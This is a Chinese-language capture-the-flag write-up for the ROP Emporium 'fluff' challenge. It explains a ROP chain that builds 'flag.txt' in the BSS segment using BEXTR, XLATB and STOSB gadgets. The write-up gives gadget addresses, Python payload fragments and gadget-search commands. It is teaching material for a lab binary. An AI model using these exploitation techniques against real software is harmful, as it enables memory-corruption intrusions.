# ROP Emporium - Fluff 挑戰解題

## 概述

這是 ROP Emporium 的 `fluff` 挑戰的解題腳本。該挑戰要求我們使用一些不尋常的 x86 指令來構建 ROP 鏈，最終讀取並印出 `flag.txt` 文件的內容。

## 挑戰分析

### 目標
- 在 BSS 段中構建字符串 "flag.txt"
- 調用 `print_file` 函數來讀取並顯示文件內容

### 關鍵 Gadgets

```assembly
gadget1: 0x400628  # xlatb; ret
gadget2: 0x40062a  # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret  
gadget3: 0x400639  # stosb byte ptr [rdi], al; ret
```

### 核心技術

這個挑戰使用三個特殊的 x86 指令來實現字節級別的內存操作：

1. **BEXTR** - 位提取指令，用於設置 RBX 寄存器
2. **XLATB** - 表格查找指令，從內存讀取字節到 AL
3. **STOSB** - 存儲字符串指令，將 AL 的值寫入內存

## 工作流程

整個攻擊分為三個步驟的循環：

```
1. BEXTR  → 將目標字符的地址放入 RBX
2. XLATB  → 從 RBX 地址讀取字節到 AL  
3. STOSB  → 將 AL 中的字節寫入目標位置
```

### 步驟詳解

#### 1. 設置 RBX (使用 BEXTR)
```python
def set_rbx(addr):
    rdx = p8(32) + p8(32) + p16(0) + p32(0)  # BEXTR 參數
    rcx = p32(0) + p32(addr)                  # 目標地址
    payload = p64(gadget2) + rdx + rcx
    return payload
```

#### 2. 讀取字節 (使用 XLATB)
- `xlatb` 指令從 `[rbx + al]` 地址讀取一個字節到 `al`
- 需要考慮 AL 寄存器的當前值來計算正確的源地址

#### 3. 寫入字節 (使用 STOSB)  
- `stosb` 指令將 `al` 中的字節寫入 `[rdi]` 指向的地址
- 使用 `pop rdi` gadget 來設置目標地址

## 字符映射獲取方法

### 使用 Radare2 尋找字符

**操作步驟**:
```bash
r2 fluff          # 打開二進制文件
aaa               # 分析所有函數和符號
/ f               # 搜索字符 'f'
/ l               # 搜索字符 'l'  
/ a               # 搜索字符 'a'
/ g               # 搜索字符 'g'
/ .               # 搜索字符 '.'
/ t               # 搜索字符 't'
/ x               # 搜索字符 'x'
```

**獲得的字符地址映射**:
```python
char_map = {
    'f': 0x0040058a,
    'l': 0x004003e4, 
    'a': 0x00400424,
    'g': 0x004003cf,
    '.': 0x004003fd,
    't': 0x004003e0,
    'x': 0x00400725
}
```

### 驗證字符地址

在 Radare2 中驗證找到的地址：
```bash
px 1 @ 0x0040058a  # 檢查地址內容
# 輸出: 66 'f'

px 1 @ 0x004003e4  # 檢查地址內容  
# 輸出: 6c 'l'
```

### 為什麼需要字符映射？

由於這個挑戰：
1. **沒有直接的字符串**: 程序中沒有現成的 "flag.txt" 字符串
2. **需要逐字節構建**: 必須在 BSS 段中手動構建目標字符串
3. **XLATB 限制**: 只能從已存在的內存位置讀取字符
4. **分散存儲**: 需要的字符散布在程序的不同位置（函數名、字符串常量等）

### 字符來源分析

這些字符通常來自：
- 函數名稱中的字符
- 錯誤消息或提示文字
- 庫函數引用
- 編譯器生成的字符串常量

## 利用腳本

### 主要函數

- `set_rbx(addr)`: 使用 BEXTR 設置源地址
- `write_byte(addr, char, offset)`: 完整的寫字節流程
- 構建 "flag.txt" 字符串到 BSS 段
- 調用 `print_file` 函數

### 關鍵變量

- `bss = 0x601038`: BSS 段地址，用於存儲構建的字符串
- `print_file = 0x00400510`: 打印文件的函數地址  
- `pop_rdi = 0x004006a3`: RDI 寄存器設置 gadget

## 運行方法

```bash
python3 exploit.py
```

## 學習重點

1. **不常見指令的利用**: 學會使用 BEXTR、XLATB、STOSB 等指令
2. **寄存器狀態管理**: 需要跟踪和管理 AL 寄存器的值
3. **字節級內存操作**: 逐字節構建字符串的技術
4. **複雜 ROP 鏈構建**: 多個 gadget 的有序組合

## 主要難點解析

### 1. Gadget 尋找困難

**問題**: 標準深度無法找到所需的 `pop rdx ; pop rcx` gadget

**解決方案**: 
```bash
ROPgadget --binary ./fluff --depth 20 | grep -i 'pop rdx ; pop rcx'
```

**原因分析**:
- 默認深度（通常 3-5）無法涵蓋複雜的指令序列
- `pop rdx ; pop rcx ; add rcx, 0x3ef2 ; bextr rbx, rcx, rdx ; ret` 這個 gadget 包含多個指令
- 需要增加搜索深度到 20 才能發現這個關鍵 gadget
- 使用 `grep -i` 進行不區分大小寫的搜索

### 2. XLATB 指令與 AL 寄存器狀態管理

**XLATB 指令行為**:
```
AL = [BX/EBX/RBX + AL]
```

用偽代碼表示:
```c
AL = *(table_base + AL);
```

**核心問題**: `al = ord(char)` 的必要性

**技術解釋**:
```python
def write_byte(addr, char, offset):
    global al
    # 設置 RBX = addr - al (當前AL值)
    payload = set_rbx(addr - al)  
    payload += p64(gadget1)       # xlatb: AL = [RBX + AL]
    al = ord(char)                # 更新AL狀態追踪
```

**執行流程詳解**:
1. **計算階段**: `rbx = char_addr - current_al`
2. **XLATB 執行**: `AL = [rbx + current_al] = [char_addr - current_al + current_al] = [char_addr]`  
3. **結果**: AL 成功獲得目標字符的 ASCII 值
4. **狀態更新**: 程序中的 `al = ord(char)` 用於追踪下次計算

**狀態追踪重要性**:
1. **初始狀態**: `al = 11` (程序啟動時的值)
2. **每次寫入後**: AL 變為寫入字符的 ASCII 值  
3. **下次計算**: 必須用新的 AL 值來計算正確的偏移地址

**為什麼需要狀態追踪**:
- XLATB 是表格查找指令，需要 **當前 AL 值** 作為索引偏移
- 如果不知道 AL 的當前值，無法計算正確的 RBX 地址
- 每次 XLATB 執行都會改變 AL，必須同步更新追踪變量

### 3. BEXTR 指令的複雜性

**指令格式**: `bextr rbx, rcx, rdx`

**控制字格式**:
控制寄存器 RDX 的低16位包含提取參數:
```
Bits 15:8 = LENGTH (提取長度, 0-255)  
Bits 7:0  = START  (起始位置, 0-255)
```

**執行邏輯**:
```
DEST = (SRC >> START) & ((1 << LENGTH) - 1)
```

**參數設置詳解**:
```python
rdx = p8(32) + p8(32) + p16(0) + p32(0)  
# p8(32): START = 32 (從第32位開始)
# p8(32): LENGTH = 32 (提取32位長度)
# 實際上就是提取完整的32位地址

rcx = p32(0) + p32(addr)  # 目標地址放在高32位
```

在我們的利用中:
- `bextr rbx, rcx, rdx` 將 RCX 的高32位提取到 RBX
- 這樣就成功將目標地址設置到 RBX 寄存器中

### 4. 字節序和內存佈局

**地址計算挑戰**:
- 字符在內存中的實際位置需要精確定位
- 不同字符可能分散在程序的各個段中
- 需要通過逆向工程確定每個字符的準確地址

## 調試技巧

### 1. 驗證 Gadget 搜索
```bash
# 逐步增加深度直到找到所需 gadget
ROPgadget --binary ./fluff --depth 10
ROPgadget --binary ./fluff --depth 15  
ROPgadget --binary ./fluff --depth 20
```

### 2. AL 寄存器追踪
```python
# 在每次操作後打印 AL 值
print(f"Current AL value: {al} ('{chr(al)}')")
```

### 3. 內存佈局檢查
```bash
# 使用 GDB 檢查字符地址的內容
gdb ./fluff
(gdb) x/c 0x0040058a  # 檢查 'f' 的地址
```

## 注意事項

- AL 寄存器的初始值會影響 XLATB 指令的行為
- 需要準確計算每個字符在內存中的位置
- BSS 段是可寫的，適合存儲構建的字符串
- Gadget 搜索需要足夠的深度才能發現複雜指令序列

---

*這個挑戰展示了 ROP 攻擊的高級技巧，特別是利用不常見的 x86 指令來實現復雜的內存操作，以及精確的寄存器狀態管理的重要性。*